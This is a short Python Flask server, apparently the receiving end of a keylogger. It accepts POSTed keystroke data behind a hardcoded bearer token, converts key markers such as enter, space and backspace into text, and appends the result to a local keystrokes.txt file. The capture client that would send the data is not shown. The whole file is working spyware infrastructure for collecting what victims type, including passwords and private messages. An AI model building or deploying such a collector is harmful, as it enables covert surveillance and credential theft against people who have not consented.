from flask import Flask, abort , request

app = Flask(__name__)

AUTH_TOKEN = "12345"

@app.route("/",methods=["POST"])
def log_keystrokes():
    if request.headers.get("Authorization") != f"Bearer {AUTH_TOKEN}":
        abort(403)
        
    keystrokes = request.form.get("keystrokes")
    processed_keystrokes = keystrokes.replace("<enter>", "\n").replace("<space>", " ").replace("<tab>", "\t").replace("<backspace>", "\b").replace("<shift>", "").replace("<shift_r>", "")
    with open("keystrokes.txt", "a") as f:
        f.write(processed_keystrokes + "\n")
    return "OK"

if __name__ == "__main__":
    app.run (port=8080)